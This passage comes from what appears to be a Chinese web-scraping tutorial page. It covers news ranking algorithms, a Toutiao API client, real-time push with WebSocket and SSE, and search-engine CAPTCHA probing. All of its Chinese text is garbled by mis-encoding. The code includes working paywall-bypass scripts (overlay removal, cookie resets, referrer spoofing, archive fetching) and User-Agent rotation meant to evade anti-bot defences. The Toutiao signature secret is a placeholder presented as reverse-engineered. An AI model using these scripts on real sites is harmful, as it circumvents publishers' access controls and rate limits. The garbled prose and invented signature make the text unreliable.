    # æ—¶é—´è¡°å‡ï¼ˆReddit epoch: 2005-12-08 07:46:43ï¼‰
    epoch = datetime(2005, 12, 8, 7, 46, 43)
    seconds = (date - epoch).total_seconds() - 1134028003

    return round(sign * order + seconds / 45000, 7)

# ç¤ºä¾‹
post1_score = reddit_hot_score(
    ups=100,
    downs=10,
    date=datetime.now()
)

post2_score = reddit_hot_score(
    ups=500,
    downs=50,
    date=datetime.now()
)

print(f&quot;Post 1 score: {post1_score}&quot;)
print(f&quot;Post 2 score: {post2_score}&quot;)
</code></pre>
<h3>Hacker News æ’åç®—æ³•</h3>
<pre><code class="language-python">from datetime import datetime

def hackernews_ranking(points, num_comments, hours_since_submission, gravity=1.8):
    &quot;&quot;&quot;
    Hacker News æ’åç®—æ³•
    - points: ç‚¹æ•°ï¼ˆç‚¹èµ - è¸©ï¼‰
    - num_comments: è¯„è®ºæ•°
    - hours_since_submission: å‘å¸ƒåçš„å°æ—¶æ•°
    - gravity: é‡åŠ›å‚æ•°ï¼ˆé»˜è®¤ 1.8ï¼‰
    &quot;&quot;&quot;
    return (points - 1) / pow((hours_since_submission + 2), gravity)

# ç¤ºä¾‹
story1_rank = hackernews_ranking(
    points=150,
    num_comments=30,
    hours_since_submission=2
)

story2_rank = hackernews_ranking(
    points=80,
    num_comments=10,
    hours_since_submission=6
)

print(f&quot;Story 1 rank: {story1_rank}&quot;)
print(f&quot;Story 2 rank: {story2_rank}&quot;)
</code></pre>
<h3>ä»Šæ—¥å¤´æ¡æ¨èé€†å‘</h3>
<p>é€šè¿‡æŠ“åŒ…åˆ†æï¼Œå‘ç°ä»Šæ—¥å¤´æ¡ä½¿ç”¨ä»¥ä¸‹å‚æ•°:</p>
<pre><code class="language-python">import requests
import hashlib
import time
import json

class ToutiaoRecommender:
    def __init__(self):
        self.base_url = &quot;https://www.toutiao.com/api/pc/feed/&quot;
        self.session = requests.Session()

    def generate_signature(self, timestamp):
        &quot;&quot;&quot;
        ç”Ÿæˆç­¾å
        é€†å‘è‡ª Toutiao çš„ JS ä»£ç 
        &quot;&quot;&quot;
        # ç®€åŒ–ç‰ˆæœ¬ï¼ˆå®é™…ç®—æ³•æ›´å¤æ‚ï¼‰
        secret = &quot;toutiao_secret_2024&quot;
        str_to_sign = f&quot;{timestamp}|{secret}&quot;
        return hashlib.md5(str_to_sign.encode()).hexdigest()

    def get_recommendations(self, category='news', count=20):
        &quot;&quot;&quot;è·å–æ¨èå†…å®¹&quot;&quot;&quot;
        timestamp = int(time.time())
        signature = self.generate_signature(timestamp)

        params = {
            'category': category,
            'count': count,
            'min_behot_time': timestamp,
            '_signature': signature
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Referer': 'https://www.toutiao.com/'
        }

        response = self.session.get(
            self.base_url,
            params=params,
            headers=headers
        )

        data = response.json()

        articles = []
        for item in data.get('data', []):
            article = {
                'title': item.get('title'),
                'url': item.get('source_url'),
                'abstract': item.get('abstract'),
                'source': item.get('source'),
                'publish_time': item.get('publish_time'),
                'has_video': item.get('has_video', False),
                'image_url': item.get('image_url')
            }
            articles.append(article)

        return articles

# ä½¿ç”¨ç¤ºä¾‹
recommender = ToutiaoRecommender()
articles = recommender.get_recommendations(category='tech', count=10)

for article in articles:
    print(f&quot;[{article['source']}] {article['title']}&quot;)
    print(f&quot;  {article['url']}&quot;)
</code></pre>
<h3>ååŒè¿‡æ»¤æ¨èå®ç°</h3>
<pre><code class="language-python">import numpy as np
from sklearn.metrics.pairwise import cosine_similarity

class CollaborativeFilteringRecommender:
    def __init__(self):
        self.user_item_matrix = None
        self.item_similarity = None

    def fit(self, user_item_matrix):
        &quot;&quot;&quot;
        è®­ç»ƒæ¨èæ¨¡å‹
        user_item_matrix: numpy array, shape (n_users, n_items)
        &quot;&quot;&quot;
        self.user_item_matrix = user_item_matrix

        # è®¡ç®—ç‰©å“ç›¸ä¼¼åº¦ï¼ˆåŸºäºç”¨æˆ·è¡Œä¸ºï¼‰
        self.item_similarity = cosine_similarity(user_item_matrix.T)

    def recommend(self, user_id, top_n=10):
        &quot;&quot;&quot;ä¸ºç”¨æˆ·æ¨è top_n ç¯‡æ–‡ç« &quot;&quot;&quot;
        # è·å–ç”¨æˆ·å·²é˜…è¯»çš„æ–‡ç« 
        user_ratings = self.user_item_matrix[user_id]

        # è®¡ç®—æ¨èåˆ†æ•°
        scores = self.item_similarity.T.dot(user_ratings)

        # æ’é™¤å·²é˜…è¯»çš„æ–‡ç« 
        scores[user_ratings &gt; 0] = -1

        # è¿”å› top_n
        top_items = np.argsort(scores)[::-1][:top_n]

        return top_items

# ç¤ºä¾‹
# ç”¨æˆ·-æ–‡ç« çŸ©é˜µï¼ˆ1 è¡¨ç¤ºé˜…è¯»ï¼Œ0 è¡¨ç¤ºæœªé˜…è¯»ï¼‰
user_item_matrix = np.array([
    [1, 1, 0, 0, 1, 0],  # ç”¨æˆ· 0
    [1, 0, 1, 0, 0, 1],  # ç”¨æˆ· 1
    [0, 1, 1, 1, 0, 0],  # ç”¨æˆ· 2
    [0, 0, 1, 1, 1, 1],  # ç”¨æˆ· 3
])

recommender = CollaborativeFilteringRecommender()
recommender.fit(user_item_matrix)

# ä¸ºç”¨æˆ· 0 æ¨è
recommendations = recommender.recommend(user_id=0, top_n=3)
print(f&quot;Recommended articles for user 0: {recommendations}&quot;)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 3: å®æ—¶æ–°é—»æ¨é€ï¼ˆWebSocket/SSEï¼‰</h2>
<h3>èƒŒæ™¯</h3>
<p>ç°ä»£æ–°é—»ç½‘ç«™ä½¿ç”¨ WebSocket æˆ– Server-Sent Events (SSE) æ¨é€å®æ—¶æ–°é—»ã€‚</p>
<h3>WebSocket å®æ—¶æ¨é€</h3>
<h4>æœåŠ¡ç«¯ï¼ˆNode.jsï¼‰</h4>
<pre><code class="language-javascript">const WebSocket = require(&quot;ws&quot;);
const wss = new WebSocket.Server({ port: 8080 });

// æ¨¡æ‹Ÿæ–°é—»æº
function getLatestNews() {
  return {
    id: Date.now(),
    title: `Breaking News at ${new Date().toLocaleTimeString()}`,
    content: &quot;Lorem ipsum dolor sit amet...&quot;,
    timestamp: Date.now(),
  };
}

// å¹¿æ’­ç»™æ‰€æœ‰å®¢æˆ·ç«¯
wss.on(&quot;connection&quot;, (ws) =&gt; {
  console.log(&quot;New client connected&quot;);

  // æ¯ 5 ç§’æ¨é€ä¸€æ¡æ–°é—»
  const interval = setInterval(() =&gt; {
    const news = getLatestNews();
    ws.send(JSON.stringify(news));
  }, 5000);

  ws.on(&quot;close&quot;, () =&gt; {
    clearInterval(interval);
    console.log(&quot;Client disconnected&quot;);
  });
});
</code></pre>
<h4>å®¢æˆ·ç«¯ï¼ˆPythonï¼‰</h4>
<pre><code class="language-python">import websocket
import json
import threading

class RealtimeNewsClient:
    def __init__(self, ws_url):
        self.ws_url = ws_url
        self.ws = None
        self.news_callback = None

    def on_message(self, ws, message):
        &quot;&quot;&quot;æ”¶åˆ°æ¶ˆæ¯æ—¶çš„å›è°ƒ&quot;&quot;&quot;
        try:
            news = json.loads(message)
            print(f&quot;[{news['timestamp']}] {news['title']}&quot;)

            if self.news_callback:
                self.news_callback(news)

        except Exception as e:
            print(f&quot;Error parsing message: {e}&quot;)

    def on_error(self, ws, error):
        &quot;&quot;&quot;é”™è¯¯å›è°ƒ&quot;&quot;&quot;
        print(f&quot;WebSocket error: {error}&quot;)

    def on_close(self, ws, close_status_code, close_msg):
        &quot;&quot;&quot;è¿æ¥å…³é—­å›è°ƒ&quot;&quot;&quot;
        print(&quot;WebSocket connection closed&quot;)

    def on_open(self, ws):
        &quot;&quot;&quot;è¿æ¥å»ºç«‹å›è°ƒ&quot;&quot;&quot;
        print(&quot;WebSocket connection opened&quot;)

    def connect(self, callback=None):
        &quot;&quot;&quot;è¿æ¥åˆ° WebSocket æœåŠ¡å™¨&quot;&quot;&quot;
        self.news_callback = callback

        self.ws = websocket.WebSocketApp(
            self.ws_url,
            on_open=self.on_open,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close
        )

        # åœ¨å•ç‹¬çš„çº¿ç¨‹ä¸­è¿è¡Œ
        wst = threading.Thread(target=self.ws.run_forever)
        wst.daemon = True
        wst.start()

    def send(self, message):
        &quot;&quot;&quot;å‘é€æ¶ˆæ¯&quot;&quot;&quot;
        if self.ws:
            self.ws.send(json.dumps(message))

    def close(self):
        &quot;&quot;&quot;å…³é—­è¿æ¥&quot;&quot;&quot;
        if self.ws:
            self.ws.close()

# ä½¿ç”¨ç¤ºä¾‹
def handle_news(news):
    &quot;&quot;&quot;å¤„ç†æ¥æ”¶åˆ°çš„æ–°é—»&quot;&quot;&quot;
    print(f&quot;Received: {news['title']}&quot;)
    # ä¿å­˜åˆ°æ•°æ®åº“ã€å‘é€é€šçŸ¥ç­‰

client = RealtimeNewsClient('ws://localhost:8080')
client.connect(callback=handle_news)

# ä¿æŒè¿è¡Œ
import time
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    client.close()
</code></pre>
<h3>Server-Sent Events (SSE)</h3>
<h4>æœåŠ¡ç«¯ï¼ˆPython Flaskï¼‰</h4>
<pre><code class="language-python">from flask import Flask, Response
import time
import json

app = Flask(__name__)

def generate_news_stream():
    &quot;&quot;&quot;ç”Ÿæˆæ–°é—»æµ&quot;&quot;&quot;
    while True:
        news = {
            'id': int(time.time()),
            'title': f'Breaking News at {time.strftime(&quot;%H:%M:%S&quot;)}',
            'content': 'Lorem ipsum dolor sit amet...',
            'timestamp': int(time.time())
        }

        # SSE æ ¼å¼
        yield f&quot;data: {json.dumps(news)}\n\n&quot;

        time.sleep(5)

@app.route('/news/stream')
def news_stream():
    &quot;&quot;&quot;SSE ç«¯ç‚¹&quot;&quot;&quot;
    return Response(
        generate_news_stream(),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no'
        }
    )

if __name__ == '__main__':
    app.run(debug=True, threaded=True)
</code></pre>
<h4>å®¢æˆ·ç«¯ï¼ˆPythonï¼‰</h4>
<pre><code class="language-python">import requests
import json

class SSENewsClient:
    def __init__(self, sse_url):
        self.sse_url = sse_url

    def listen(self, callback):
        &quot;&quot;&quot;ç›‘å¬ SSE äº‹ä»¶&quot;&quot;&quot;
        headers = {
            'Accept': 'text/event-stream',
            'Cache-Control': 'no-cache'
        }

        response = requests.get(
            self.sse_url,
            stream=True,
            headers=headers
        )

        # é€è¡Œè¯»å–
        for line in response.iter_lines():
            if line:
                decoded_line = line.decode('utf-8')

                # SSE äº‹ä»¶æ ¼å¼: &quot;data: {...}&quot;
                if decoded_line.startswith('data:'):
                    data = decoded_line[5:].strip()

                    try:
                        news = json.loads(data)
                        callback(news)
                    except Exception as e:
                        print(f&quot;Error parsing SSE data: {e}&quot;)

# ä½¿ç”¨ç¤ºä¾‹
def handle_sse_news(news):
    print(f&quot;[SSE] {news['title']}&quot;)

client = SSENewsClient('http://localhost:5000/news/stream')
client.listen(callback=handle_sse_news)
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 4: ä»˜è´¹å¢™ç»•è¿‡ä¸å†…å®¹æå–</h2>
<h3>èƒŒæ™¯</h3>
<p>è®¸å¤šæ–°é—»ç½‘ç«™ä½¿ç”¨ä»˜è´¹å¢™ï¼ˆPaywallï¼‰é™åˆ¶å†…å®¹è®¿é—®ã€‚å¸¸è§ç±»å‹åŒ…æ‹¬ç¡¬ä»˜è´¹å¢™å’Œè½¯ä»˜è´¹å¢™ã€‚</p>
<h3>è½¯ä»˜è´¹å¢™ç±»å‹</h3>
<h4>1. JavaScript éšè—å†…å®¹</h4>
<p>å†…å®¹åœ¨ HTML ä¸­ï¼Œä½†ç”¨ CSS/JS éšè—:</p>
<pre><code class="language-html">&lt;div class=&quot;article-content&quot;&gt;
  &lt;p&gt;First paragraph visible...&lt;/p&gt;
  &lt;div class=&quot;paywall-blur&quot;&gt;
    &lt;p&gt;Premium content hidden here...&lt;/p&gt;
    &lt;p&gt;More premium content...&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;

&lt;div class=&quot;paywall-overlay&quot;&gt;
  &lt;h3&gt;Subscribe to read more&lt;/h3&gt;
  &lt;button&gt;Subscribe Now&lt;/button&gt;
&lt;/div&gt;

&lt;style&gt;
  .paywall-blur {
    filter: blur(5px);
    user-select: none;
  }
&lt;/style&gt;
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<pre><code class="language-python">from bs4 import BeautifulSoup
import requests

def bypass_soft_paywall(url):
    &quot;&quot;&quot;ç»•è¿‡è½¯ä»˜è´¹å¢™&quot;&quot;&quot;
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # ç§»é™¤ä»˜è´¹å¢™é®ç½©
    for overlay in soup.find_all(class_='paywall-overlay'):
        overlay.decompose()

    # ç§»é™¤æ¨¡ç³Šæ•ˆæœï¼ˆé€šè¿‡æå–åŸå§‹å†…å®¹ï¼‰
    blurred = soup.find_all(class_='paywall-blur')
    for element in blurred:
        element['class'] = []  # ç§»é™¤ class

    # æå–å®Œæ•´æ–‡æœ¬
    article = soup.find(class_='article-content')
    return article.get_text(strip=True) if article else None

# ä½¿ç”¨ç¤ºä¾‹
content = bypass_soft_paywall('https://news.example.com/premium-article')
print(content)
</code></pre>
<h4>2. Cookie é™åˆ¶</h4>
<p>é™åˆ¶å…è´¹æ–‡ç« æ•°é‡ï¼ˆé€šè¿‡ Cookie è¿½è¸ªï¼‰:</p>
<pre><code class="language-python">class PaywallBypass:
    def __init__(self):
        self.session = requests.Session()

    def clear_cookies(self):
        &quot;&quot;&quot;æ¸…é™¤ cookies é‡ç½®è®¡æ•°&quot;&quot;&quot;
        self.session.cookies.clear()

    def use_incognito_headers(self):
        &quot;&quot;&quot;ä½¿ç”¨éšèº«æ¨¡å¼è¯·æ±‚å¤´&quot;&quot;&quot;
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Referer': 'https://www.google.com/',
            'DNT': '1'
        })

    def get_article(self, url):
        &quot;&quot;&quot;è·å–æ–‡ç« ï¼ˆç»•è¿‡ cookie é™åˆ¶ï¼‰&quot;&quot;&quot;
        self.clear_cookies()
        self.use_incognito_headers()

        response = self.session.get(url)
        return response.text

# ä½¿ç”¨ç¤ºä¾‹
bypass = PaywallBypass()
content = bypass.get_article('https://news.example.com/article/123')
</code></pre>
<h4>3. Google/Facebook Referrer ç»•è¿‡</h4>
<p>æŸäº›ç½‘ç«™å…è®¸ä»æœç´¢å¼•æ“/ç¤¾äº¤åª’ä½“æ¥çš„æµé‡:</p>
<pre><code class="language-python">def bypass_with_referrer(url):
    &quot;&quot;&quot;ä½¿ç”¨ Referrer ç»•è¿‡ä»˜è´¹å¢™&quot;&quot;&quot;
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': 'https://www.google.com/'  # æˆ– 'https://t.co/'
    }

    response = requests.get(url, headers=headers)
    return response.text

# ä½¿ç”¨ç¤ºä¾‹
content = bypass_with_referrer('https://news.example.com/article/123')
</code></pre>
<h3>Archive.is / Web Archive ç»•è¿‡</h3>
<pre><code class="language-python">import requests
from urllib.parse import quote

class ArchiveBypass:
    def __init__(self):
        self.archive_api = &quot;https://archive.is/submit/&quot;
        self.wayback_api = &quot;https://web.archive.org/save/&quot;

    def archive_is(self, url):
        &quot;&quot;&quot;ä½¿ç”¨ Archive.is å­˜æ¡£å¹¶è·å–å†…å®¹&quot;&quot;&quot;
        # æäº¤å­˜æ¡£è¯·æ±‚
        data = {'url': url}
        response = requests.post(self.archive_api, data=data, allow_redirects=False)

        # è·å–å­˜æ¡£ URL
        archive_url = response.headers.get('Location')

        if archive_url:
            # è·å–å­˜æ¡£å†…å®¹
            archive_content = requests.get(archive_url).text
            return archive_content
        else:
            return None

    def wayback_machine(self, url):
        &quot;&quot;&quot;ä½¿ç”¨ Wayback Machine&quot;&quot;&quot;
        # ä¿å­˜å¿«ç…§
        save_url = f&quot;{self.wayback_api}{url}&quot;
        requests.get(save_url)

        # è·å–æœ€æ–°å¿«ç…§
        snapshot_url = f&quot;https://web.archive.org/web/{url}&quot;
        response = requests.get(snapshot_url)

        return response.text

# ä½¿ç”¨ç¤ºä¾‹
bypass = ArchiveBypass()
content = bypass.archive_is('https://news.example.com/premium-article')
</code></pre>
<hr />
<h2>æ¡ˆä¾‹ 5: åçˆ¬è™«å¯¹æŠ—ä¸å†…å®¹å»é‡</h2>
<h3>èƒŒæ™¯</h3>
<p>æ–°é—»èšåˆç½‘ç«™éœ€è¦å¤„ç†å¤§é‡å†…å®¹ï¼ŒåŒæ—¶é¿å…è¢«æºç½‘ç«™å°ç¦ã€‚</p>
<h3>User-Agent è½®æ¢</h3>
<pre><code class="language-python">import random

class UserAgentRotator:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15'
        ]

    def get_random_ua(self):
        &quot;&quot;&quot;è·å–éšæœº User-Agent&quot;&quot;&quot;
        return random.choice(self.user_agents)

    def make_request(self, url):
        &quot;&quot;&quot;ä½¿ç”¨éšæœº UA å‘é€è¯·æ±‚&quot;&quot;&quot;
        headers = {'User-Agent': self.get_random_ua()}
        response = requests.get(url, headers=headers)
        return response.text
</code></pre>
<h3>å†…å®¹å»é‡ï¼ˆSimHashï¼‰</h3>
<pre><code class="language-python">import hashlib
from collections import defaultdict

class ContentDeduplicator:
    def __init__(self, threshold=3):
        &quot;&quot;&quot;
        threshold: æ±‰æ˜è·ç¦»é˜ˆå€¼ï¼ˆè¶Šå°è¶Šä¸¥æ ¼ï¼‰
        &quot;&quot;&quot;
        self.threshold = threshold
        self.seen_hashes = {}

    def simhash(self, text, hashbits=64):
        &quot;&quot;&quot;è®¡ç®—æ–‡æœ¬çš„ SimHash&quot;&quot;&quot;
        # åˆ†è¯ï¼ˆç®€åŒ–ç‰ˆæœ¬ï¼‰
        tokens = text.lower().split()

        # è¯é¢‘ç»Ÿè®¡
        freq = defaultdict(int)
        for token in tokens:
            freq[token] += 1

        # åˆå§‹åŒ–å‘é‡
        vector = [0] * hashbits

        for token, weight in freq.items():
            # è®¡ç®— token çš„ hash
            h = int(hashlib.md5(token.encode()).hexdigest(), 16)

            for i in range(hashbits):
                # æ£€æŸ¥ç¬¬ i ä½æ˜¯å¦ä¸º 1
                if h &amp; (1 &lt;&lt; i):
                    vector[i] += weight
                else:
                    vector[i] -= weight

        # ç”Ÿæˆ SimHash
        fingerprint = 0
        for i in range(hashbits):
            if vector[i] &gt; 0:
                fingerprint |= (1 &lt;&lt; i)

        return fingerprint

    def hamming_distance(self, hash1, hash2):
        &quot;&quot;&quot;è®¡ç®—æ±‰æ˜è·ç¦»&quot;&quot;&quot;
        x = hash1 ^ hash2
        distance = 0

        while x:
            distance += 1
            x &amp;= x - 1

        return distance

    def is_duplicate(self, text, article_id):
        &quot;&quot;&quot;æ£€æŸ¥æ–‡ç« æ˜¯å¦é‡å¤&quot;&quot;&quot;
        fingerprint = self.simhash(text)

        # æ£€æŸ¥æ˜¯å¦ä¸å·²å­˜åœ¨çš„æ–‡ç« ç›¸ä¼¼
        for existing_id, existing_hash in self.seen_hashes.items():
            distance = self.hamming_distance(fingerprint, existing_hash)

            if distance &lt;= self.threshold:
                return True, existing_id

        # ä¿å­˜æ–°æ–‡ç« çš„ hash
        self.seen_hashes[article_id] = fingerprint

        return False, None

# ä½¿ç”¨ç¤ºä¾‹
dedup = ContentDeduplicator(threshold=3)

articles = [
    {'id': 1, 'text': 'Breaking news: AI makes major breakthrough in language processing'},
    {'id': 2, 'text': 'Breaking news: AI makes significant breakthrough in language processing'},
    {'id': 3, 'text': 'Weather forecast shows sunny skies ahead'},
]

for article in articles:
    is_dup, original_id = dedup.is_duplicate(article['text'], article['id'])

    if is_dup:
        print(f&quot;Article {article['id']} is duplicate of {original_id}&quot;)
    else:
        print(f&quot;Article {article['id']} is unique&quot;)
</code></pre>
<h3>æ™ºèƒ½é™æµ</h3>
<pre><code class="language-python">import time
from collections import deque

class RateLimiter:
    def __init__(self, max_requests, time_window):
        &quot;&quot;&quot;
        max_requests: æ—¶é—´çª—å£å†…çš„æœ€å¤§è¯·æ±‚æ•°
        time_window: æ—¶é—´çª—å£ï¼ˆç§’ï¼‰
        &quot;&quot;&quot;
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests = deque()

    def wait_if_needed(self):
        &quot;&quot;&quot;å¦‚æœéœ€è¦ï¼Œç­‰å¾…ç›´åˆ°å¯ä»¥å‘é€è¯·æ±‚&quot;&quot;&quot;
        now = time.time()

        # ç§»é™¤è¶…å‡ºæ—¶é—´çª—å£çš„è¯·æ±‚
        while self.requests and self.requests[0] &lt; now - self.time_window:
            self.requests.popleft()

        # å¦‚æœè¾¾åˆ°é™åˆ¶ï¼Œç­‰å¾…
        if len(self.requests) &gt;= self.max_requests:
            sleep_time = self.requests[0] + self.time_window - now
            if sleep_time &gt; 0:
                print(f&quot;Rate limit reached, waiting {sleep_time:.2f} seconds...&quot;)
                time.sleep(sleep_time)

        # è®°å½•æœ¬æ¬¡è¯·æ±‚
        self.requests.append(time.time())

    def request(self, url):
        &quot;&quot;&quot;å‘é€å—é™æµæ§åˆ¶çš„è¯·æ±‚&quot;&quot;&quot;
        self.wait_if_needed()
        response = requests.get(url)
        return response

# ä½¿ç”¨ç¤ºä¾‹
limiter = RateLimiter(max_requests=10, time_window=60)  # æ¯åˆ†é’Ÿæœ€å¤š 10 æ¬¡

for i in range(20):
    response = limiter.request(f'https://news.example.com/article/{i}')
    print(f&quot;Fetched article {i}&quot;)
</code></pre>
<hr />
<h2>é˜²æŠ¤ä¸å¯¹æŠ—æ€»ç»“</h2>
<h3>æ–°é—»èšåˆå¹³å°é˜²æŠ¤</h3>
<ol>
<li><strong>ä»˜è´¹å¢™</strong>: JavaScript éšè—ã€Cookie é™åˆ¶ã€è®¢é˜…éªŒè¯</li>
<li><strong>åçˆ¬è™«</strong>: User-Agent æ£€æµ‹ã€é¢‘ç‡é™åˆ¶ã€CAPTCHA</li>
<li><strong>å†…å®¹ä¿æŠ¤</strong>: åè°ƒè¯•ã€æ··æ·†ã€æ°´å°</li>
<li><strong>API é™æµ</strong>: Token éªŒè¯ã€IP é™åˆ¶</li>
<li><strong>ç‰ˆæƒä¿æŠ¤</strong>: DMCA é€šçŸ¥ã€æ³•å¾‹è¡ŒåŠ¨</li>
</ol>
<h3>å¯¹æŠ—ç­–ç•¥</h3>
<ol>
<li><strong>ä»˜è´¹å¢™ç»•è¿‡</strong>: Referrer æ¬ºéª—ã€Archive å­˜æ¡£ã€æµè§ˆå™¨æ‰©å±•</li>
<li><strong>æ™ºèƒ½çˆ¬å–</strong>: UA è½®æ¢ã€ä»£ç†æ± ã€å»¶è¿Ÿæ§åˆ¶</li>
<li><strong>å†…å®¹æå–</strong>: newspaper3kã€Readabilityã€è‡ªå®šä¹‰è§£æå™¨</li>
<li><strong>å»é‡ç®—æ³•</strong>: SimHashã€MinHashã€LSH</li>
<li><strong>åˆ†å¸ƒå¼é‡‡é›†</strong>: å¤šèŠ‚ç‚¹ã€ä»»åŠ¡é˜Ÿåˆ—ã€å¢é‡æ›´æ–°</li>
</ol>
<hr />
<h2>æ³•å¾‹ä¸é“å¾·å£°æ˜</h2>
<p><strong>æœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯ç ”ç©¶å’Œæ•™è‚²ç›®çš„</strong>ã€‚æœªç»æˆæƒçˆ¬å–å’Œç»•è¿‡ä»˜è´¹å¢™å¯èƒ½è¿å:</p>
<ul>
<li>ç½‘ç«™æœåŠ¡æ¡æ¬¾ (ToS)</li>
<li>ç‰ˆæƒæ³• (Copyright Law)</li>
<li>è®¡ç®—æœºæ¬ºè¯ˆå’Œæ»¥ç”¨æ³• (CFAA)</li>
<li>æ•°å­—åƒå¹´ç‰ˆæƒæ³• (DMCA)</li>
</ul>
<p>è¯·ä»…åœ¨æˆæƒç¯å¢ƒä¸‹è¿›è¡Œæµ‹è¯•ï¼Œå°Šé‡å†…å®¹åˆ›ä½œè€…çš„æƒç›Šå’Œç‰ˆæƒã€‚</p>
<hr />
<h2>å·¥å…·æ¨è</h2>
<h3>RSS/Atom å·¥å…·</h3>
<ul>
<li><strong>feedparser</strong>: Python RSS/Atom è§£æåº“</li>
<li><strong>Feedly</strong>: å•†ä¸š RSS èšåˆæœåŠ¡</li>
<li><strong>Inoreader</strong>: RSS é˜…è¯»å™¨</li>
</ul>
<h3>å†…å®¹æå–</h3>
<ul>
<li><strong>newspaper3k</strong>: æ–°é—»æ–‡ç« æå–</li>
<li><strong>Readability</strong>: å†…å®¹æå–ç®—æ³•</li>
<li><strong>Trafilatura</strong>: ç½‘é¡µå†…å®¹æå–</li>
<li><strong>BeautifulSoup</strong>: HTML è§£æ</li>
</ul>
<h3>å»é‡ç®—æ³•</h3>
<ul>
<li><strong>simhash</strong>: æ–‡æœ¬æŒ‡çº¹</li>
<li><strong>datasketch</strong>: MinHash å®ç°</li>
<li><strong>faiss</strong>: å‘é‡ç›¸ä¼¼åº¦æœç´¢</li>
</ul>
<h3>å®æ—¶æ¨é€</h3>
<ul>
<li><strong>websocket-client</strong>: Python WebSocket å®¢æˆ·ç«¯</li>
<li><strong>Socket.IO</strong>: å®æ—¶é€šä¿¡æ¡†æ¶</li>
<li><strong>SSE</strong>: Server-Sent Events</li>
</ul>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-5">HTTP/HTTPS åè®®</a></li>
<li>JavaScript Hook æŠ€æœ¯</li>
<li><a href="#section-31">WebSocket é€†å‘</a></li>
<li><a href="#section-39">å†…å®¹å®‰å…¨ç­–ç•¥ç»•è¿‡</a></li>
<li><a href="#section-50">æœç´¢å¼•æ“å¯¹æŠ—</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-50">
                                                <h2>[R49] Search Engine</h2>
                                                <h1>R49: æœç´¢å¼•æ“å¯¹æŠ—</h1>
<h2>æ¦‚è¿°</h2>
<p>æœç´¢å¼•æ“æ‹¥æœ‰ä¸šç•Œæœ€å¼ºçš„åçˆ¬è™«é˜²æŠ¤æœºåˆ¶ã€‚æœ¬æ–‡é€šè¿‡ 5 ä¸ªçœŸå®æ¡ˆä¾‹ï¼Œè®²è§£æœç´¢å¼•æ“çš„é˜²æŠ¤æŠ€æœ¯åŠå…¶å¯¹æŠ—ç­–ç•¥ã€‚</p>
<hr />
<h2>æ¡ˆä¾‹ 1: CAPTCHA ä¸é¢‘ç‡é™åˆ¶ç»•è¿‡</h2>
<h3>èƒŒæ™¯</h3>
<p>æœç´¢å¼•æ“ï¼ˆGoogleã€Bingã€ç™¾åº¦ï¼‰ä½¿ç”¨ CAPTCHAï¼ˆéªŒè¯ç ï¼‰å’Œ IP é¢‘ç‡é™åˆ¶æ¥é˜²æ­¢è‡ªåŠ¨åŒ–çˆ¬å–ã€‚</p>
<h3>é˜²æŠ¤æœºåˆ¶</h3>
<h4>1. CAPTCHA ç±»å‹</h4>
<p><strong>Google reCAPTCHA v3</strong>:</p>
<pre><code class="language-javascript">&lt;script src=&quot;https://www.google.com/recaptcha/api.js?render=site_key&quot;&gt;&lt;/script&gt;
&lt;script&gt;
grecaptcha.ready(function() {
    grecaptcha.execute('site_key', {action: 'search'}).then(function(token) {
        // å°† token å‘é€åˆ°æœåŠ¡å™¨éªŒè¯
        document.getElementById('recaptcha_token').value = token;
    });
});
&lt;/script&gt;
</code></pre>
<p><strong>hCaptcha</strong>:</p>
<pre><code class="language-html">&lt;div class=&quot;h-captcha&quot; data-sitekey=&quot;your_site_key&quot;&gt;&lt;/div&gt;
&lt;script src=&quot;https://js.hcaptcha.com/1/api.js&quot; async defer&gt;&lt;/script&gt;
</code></pre>
<h4>2. é¢‘ç‡æ£€æµ‹</h4>
<p>åŸºäºä»¥ä¸‹æŒ‡æ ‡:</p>
<ul>
<li><strong>IP åœ°å€</strong>: å• IP æ¯åˆ†é’Ÿè¯·æ±‚æ¬¡æ•°</li>
<li><strong>User-Agent</strong>: è¯†åˆ«çˆ¬è™«ç‰¹å¾</li>
<li><strong>Cookie</strong>: è¿½è¸ªç”¨æˆ·ä¼šè¯</li>
<li><strong>è¡Œä¸ºæ¨¡å¼</strong>: è¯·æ±‚é—´éš”ã€æœç´¢æ¨¡å¼</li>
</ul>
<h3>é€†å‘æ­¥éª¤</h3>
<h4>1. åˆ†æ CAPTCHA è§¦å‘æ¡ä»¶</h4>
<pre><code class="language-python">import requests
import time

def test_rate_limit():
    &quot;&quot;&quot;æµ‹è¯•æœç´¢å¼•æ“çš„é¢‘ç‡é™åˆ¶é˜ˆå€¼&quot;&quot;&quot;
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    captcha_triggered = False
    request_count = 0

    while not captcha_triggered:
        response = session.get(
            'https://www.google.com/search',
            params={'q': f'test query {request_count}'},
            headers=headers
        )

        request_count += 1

        # æ£€æµ‹æ˜¯å¦è§¦å‘ CAPTCHA
